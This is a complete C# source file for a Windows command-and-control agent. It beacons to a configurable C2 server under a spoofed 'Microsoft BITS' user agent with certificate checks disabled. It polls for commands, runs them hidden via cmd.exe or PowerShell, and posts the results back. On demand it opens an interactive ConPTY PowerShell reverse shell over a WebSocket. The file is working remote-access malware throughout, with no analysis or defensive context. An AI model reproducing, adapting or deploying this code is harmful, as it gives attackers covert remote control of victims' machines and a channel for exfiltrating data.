using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    class Program
    {
        // ============ C2 CONFIG ============
        private const string C2_URL = "%%C2_URL%%";
        private const string API_KEY = "%%API_KEY%%";
        private const string PAYLOAD_TOKEN = "%%PAYLOAD_TOKEN%%";
        // ===================================

        private static HttpClient? httpClient;
        private static string agentId = "";
        private static bool ptyRunning = false;
        private static readonly object ptyLock = new object();

        // ==================== KERNEL32 ====================
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr CreateMutexW(IntPtr lpMutexAttributes, bool bInitialOwner, string lpName);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool PeekNamedPipe(IntPtr hNamedPipe, IntPtr lpBuffer, uint nBufferSize, IntPtr lpBytesRead, out uint lpTotalBytesAvail, IntPtr lpBytesLeftThisMessage);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int ResizePseudoConsole(IntPtr hPC, COORD size);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void ClosePseudoConsole(IntPtr hPC);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessW(string? lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const int PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
        const uint WAIT_TIMEOUT = 258;
        const uint ERROR_ALREADY_EXISTS = 183;

        [StructLayout(LayoutKind.Sequential)]
        struct COORD { public short X, Y; }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_ATTRIBUTES { public int nLength; public IntPtr lpSecurityDescriptor; public bool bInheritHandle; }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string? lpReserved, lpDesktop, lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

        // ConPTY wrapper class
        class ConPty : IDisposable
        {
            public IntPtr hPC, pipeIn, pipeOut, hProcess, hThread;
            private bool disposed = false;

            public static ConPty? Create(short cols, short rows)
            {
                var sa = new SECURITY_ATTRIBUTES { nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES)), bInheritHandle = true };
                IntPtr pipeInRead, pipeInWrite, pipeOutRead, pipeOutWrite;

                if (!CreatePipe(out pipeInRead, out pipeInWrite, ref sa, 0)) return null;
                if (!CreatePipe(out pipeOutRead, out pipeOutWrite, ref sa, 0)) { CloseHandle(pipeInRead); CloseHandle(pipeInWrite); return null; }

                IntPtr hPC;
                var size = new COORD { X = cols, Y = rows };
                int hr = CreatePseudoConsole(size, pipeInRead, pipeOutWrite, 0, out hPC);
                CloseHandle(pipeInRead);
                CloseHandle(pipeOutWrite);

                if (hr != 0) { CloseHandle(pipeInWrite); CloseHandle(pipeOutRead); return null; }

                IntPtr attrSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrSize);
                IntPtr attrList = Marshal.AllocHGlobal(attrSize);
                if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrSize))
                {
                    Marshal.FreeHGlobal(attrList);
                    ClosePseudoConsole(hPC);
                    CloseHandle(pipeInWrite);
                    CloseHandle(pipeOutRead);
                    return null;
                }

                if (!UpdateProcThreadAttribute(attrList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, hPC, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
                {
                    DeleteProcThreadAttributeList(attrList);
                    Marshal.FreeHGlobal(attrList);
                    ClosePseudoConsole(hPC);
                    CloseHandle(pipeInWrite);
                    CloseHandle(pipeOutRead);
                    return null;
                }

                var si = new STARTUPINFOEX();
                si.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));
                si.lpAttributeList = attrList;

                PROCESS_INFORMATION pi;
                var cmd = new StringBuilder("powershell.exe -NoLogo -NoProfile");
                if (!CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, out pi))
                {
                    DeleteProcThreadAttributeList(attrList);
                    Marshal.FreeHGlobal(attrList);
                    ClosePseudoConsole(hPC);
                    CloseHandle(pipeInWrite);
                    CloseHandle(pipeOutRead);
                    return null;
                }

                DeleteProcThreadAttributeList(attrList);
                Marshal.FreeHGlobal(attrList);

                return new ConPty { hPC = hPC, pipeIn = pipeInWrite, pipeOut = pipeOutRead, hProcess = pi.hProcess, hThread = pi.hThread };
            }

            public int Read(byte[] buf)
            {
                uint avail;
                if (!PeekNamedPipe(pipeOut, IntPtr.Zero, 0, IntPtr.Zero, out avail, IntPtr.Zero) || avail == 0) return 0;
                uint read;
                if (!ReadFile(pipeOut, buf, Math.Min((uint)buf.Length, avail), out read, IntPtr.Zero)) return -1;
                return (int)read;
            }

            public bool Write(byte[] data)
            {
                uint written;
                return WriteFile(pipeIn, data, (uint)data.Length, out written, IntPtr.Zero);
            }

            public bool IsAlive() => WaitForSingleObject(hProcess, 0) == WAIT_TIMEOUT;

            public void Resize(short cols, short rows) => ResizePseudoConsole(hPC, new COORD { X = cols, Y = rows });

            public void Dispose()
            {
                if (!disposed)
                {
                    ClosePseudoConsole(hPC);
                    CloseHandle(pipeIn);
                    CloseHandle(pipeOut);
                    CloseHandle(hProcess);
                    CloseHandle(hThread);
                    disposed = true;
                }
            }
        }

        static void Main()
        {
            // Single instance mutex
            string mutexName = "Global\\Agent_" + PAYLOAD_TOKEN.Substring(0, 8);
            CreateMutexW(IntPtr.Zero, false, mutexName);
            if (GetLastError() == ERROR_ALREADY_EXISTS) return;

            // Setup HTTP client
            var handler = new HttpClientHandler { ServerCertificateCustomValidationCallback = (m, c, ch, e) => true };
            httpClient = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(60) };
            httpClient.DefaultRequestHeaders.Add("X-API-Key", API_KEY);
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Microsoft BITS/7.8");

            string hostname = Environment.MachineName;
            var rnd = new Random();
            agentId = hostname + "-" + rnd.Next(1, 999).ToString("x4");

            string cmdUrl = $"{C2_URL}/bits/cmd/{agentId}?key={PAYLOAD_TOKEN}";
            string resultUrl = $"{C2_URL}/bits/result/{agentId}?key={PAYLOAD_TOKEN}";
            string ptyStatusUrl = $"{C2_URL}/bits/pty-status/{agentId}";

            // Initial beacon
            try {
                var content = new StringContent(JsonSerializer.Serialize(new { result = "[C# Agent Connected]" }), Encoding.UTF8, "application/json");
                httpClient.PostAsync(resultUrl, content).Wait();
            } catch { }

            while (true)
            {
                try
                {
                    // Check PTY request
                    var ptyResp = httpClient.GetStringAsync(ptyStatusUrl).Result;
                    if (ptyResp.Contains("true")) StartPtySession();
                }
                catch { }

                try
                {
                    // Check BITS commands
                    var resp = httpClient.GetStringAsync(cmdUrl).Result;
                    string cmd = "";
                    try
                    {
                        using var doc = JsonDocument.Parse(resp);
                        if (doc.RootElement.TryGetProperty("command", out var cmdElem))
                            cmd = cmdElem.GetString() ?? "";
                    }
                    catch { cmd = resp.Trim(); }

                    if (!string.IsNullOrEmpty(cmd))
                    {
                        string result = ExecuteCommand(cmd);
                        
                        // Truncate if too large (max 500KB)
                        if (result.Length > 500000)
                            result = result.Substring(0, 500000) + "\n\n[OUTPUT TRUNCATED - " + result.Length + " bytes total]";
                        
                        // Proper JSON escaping - handle ALL control characters
                        var sb = new StringBuilder();
                        foreach (char c in result)
                        {
                            switch (c)
                            {
                                case '\\': sb.Append("\\\\"); break;
                                case '"': sb.Append("\\\""); break;
                                case '\n': sb.Append("\\n"); break;
                                case '\r': sb.Append("\\r"); break;
                                case '\t': sb.Append("\\t"); break;
                                case '\b': sb.Append("\\b"); break;
                                case '\f': sb.Append("\\f"); break;
                                default:
                                    // Escape control characters (0x00-0x1F) as \uXXXX
                                    if (c < 0x20)
                                        sb.Append($"\\u{(int)c:X4}");
                                    else
                                        sb.Append(c);
                                    break;
                            }
                        }
                        string json = "{\"result\":\"" + sb.ToString() + "\"}";
                        
                        var content = new StringContent(json, Encoding.UTF8, "application/json");
                        var postResult = httpClient.PostAsync(resultUrl, content).Result;
                        
                        // If POST failed, try sending error info
                        if (!postResult.IsSuccessStatusCode)
                        {
                            var errJson = "{\"result\":\"[POST Error: " + (int)postResult.StatusCode + "]\"}";
                            httpClient.PostAsync(resultUrl, new StringContent(errJson, Encoding.UTF8, "application/json")).Wait();
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Send exception info
                    try {
                        var errJson = "{\"result\":\"[Agent Error: " + ex.GetType().Name + " - " + ex.Message.Replace("\"", "'").Replace("\n", " ") + "]\"}";
                        httpClient.PostAsync(resultUrl, new StringContent(errJson, Encoding.UTF8, "application/json")).Wait();
                    } catch { }
                }

                Thread.Sleep(5000);
            }
        }

        static string ExecuteCommand(string cmd)
        {
            try
            {
                ProcessStartInfo psi;
                
                // If command starts with powershell, run it directly (preserves *>&1 redirection)
                if (cmd.TrimStart().StartsWith("powershell", StringComparison.OrdinalIgnoreCase))
                {
                    // Extract args after "powershell"
                    string args = cmd.TrimStart();
                    if (args.StartsWith("powershell.exe", StringComparison.OrdinalIgnoreCase))
                        args = args.Substring(14).TrimStart();
                    else if (args.StartsWith("powershell", StringComparison.OrdinalIgnoreCase))
                        args = args.Substring(10).TrimStart();
                    
                    psi = new ProcessStartInfo("powershell.exe", args);
                }
                else
                {
                    // Regular cmd command
                    psi = new ProcessStartInfo("cmd.exe", "/C " + cmd);
                }
                
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                
                using var proc = Process.Start(psi);
                if (proc == null) return "Failed to start process";
                
                // Read async to avoid deadlock with large output
                var outputTask = proc.StandardOutput.ReadToEndAsync();
                var errorTask = proc.StandardError.ReadToEndAsync();
                
                bool exited = proc.WaitForExit(120000); // 120s timeout for long scripts
                
                string output = outputTask.Result;
                string error = errorTask.Result;
                
                if (!exited) output += "\n[Timeout after 120s]";
                
                return string.IsNullOrEmpty(error) ? output : output + "\n" + error;
            }
            catch (Exception ex) { return "Error: " + ex.Message; }
        }

        static void StartPtySession()
        {
            lock (ptyLock)
            {
                if (ptyRunning) return;
                ptyRunning = true;
            }
            new Thread(() => RunPtyWebSocket()) { IsBackground = true }.Start();
        }

        static async void RunPtyWebSocket()
        {
            try
            {
                string wsUrl = C2_URL.Replace("https://", "wss://").Replace("http://", "ws://") + "/tty/" + agentId;
                using var ws = new ClientWebSocket();
                ws.Options.RemoteCertificateValidationCallback = (s, c, ch, e) => true;
                await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);

                byte[] roleMsg = Encoding.UTF8.GetBytes("{\"role\":\"agent\"}");
                await ws.SendAsync(new ArraySegment<byte>(roleMsg), WebSocketMessageType.Text, true, CancellationToken.None);

                using var pty = ConPty.Create(200, 50);
                if (pty == null)
                {
                    byte[] errMsg = Encoding.UTF8.GetBytes("ConPTY creation failed\r\n");
                    await ws.SendAsync(new ArraySegment<byte>(errMsg), WebSocketMessageType.Text, true, CancellationToken.None);
                    return;
                }

                byte[] banner = Encoding.UTF8.GetBytes("=== ConPTY " + Environment.MachineName + " ===\r\n");
                await ws.SendAsync(new ArraySegment<byte>(banner), WebSocketMessageType.Text, true, CancellationToken.None);

                var recvBuf = new byte[4096];
                var ptyBuf = new byte[4096];

                // Background receiver - CancellationToken timeout ABORTS websocket in .NET
                var inputQueue = new System.Collections.Concurrent.ConcurrentQueue<string>();
                var wsAlive = true;
                
                _ = Task.Run(async () => {
                    try {
                        while (ws.State == WebSocketState.Open) {
                            var result = await ws.ReceiveAsync(new ArraySegment<byte>(recvBuf), CancellationToken.None);
                            if (result.MessageType == WebSocketMessageType.Close) {
                                wsAlive = false;
                                break;
                            }
                            if (result.Count > 0) {
                                string input = Encoding.UTF8.GetString(recvBuf, 0, result.Count);
                                inputQueue.Enqueue(input);
                            }
                        }
                    } catch { wsAlive = false; }
                });

                while (ws.State == WebSocketState.Open && pty.IsAlive() && wsAlive)
                {
                    // Read from PTY and send to WebSocket
                    int n = pty.Read(ptyBuf);
                    if (n > 0)
                    {
                        try { await ws.SendAsync(new ArraySegment<byte>(ptyBuf, 0, n), WebSocketMessageType.Text, true, CancellationToken.None); }
                        catch { break; }
                    }

                    // Process queued input from WebSocket
                    while (inputQueue.TryDequeue(out string? input))
                    {
                        if (input == null || input == "ping" || input.StartsWith("{\"ping\":")) continue;
                        if (input.StartsWith("{\"resize\":"))
                        {
                            try
                            {
                                using var doc = JsonDocument.Parse(input);
                                if (doc.RootElement.TryGetProperty("resize", out var arr))
                                {
                                    var cols = (short)arr[0].GetInt32();
                                    var rows = (short)arr[1].GetInt32();
                                    pty.Resize(cols, rows);
                                }
                            }
                            catch { }
                            continue;
                        }
                        pty.Write(Encoding.UTF8.GetBytes(input));
                    }

                    await Task.Delay(10);
                }
            }
            catch { }
            finally
            {
                lock (ptyLock) { ptyRunning = false; }
            }
        }
    }
}
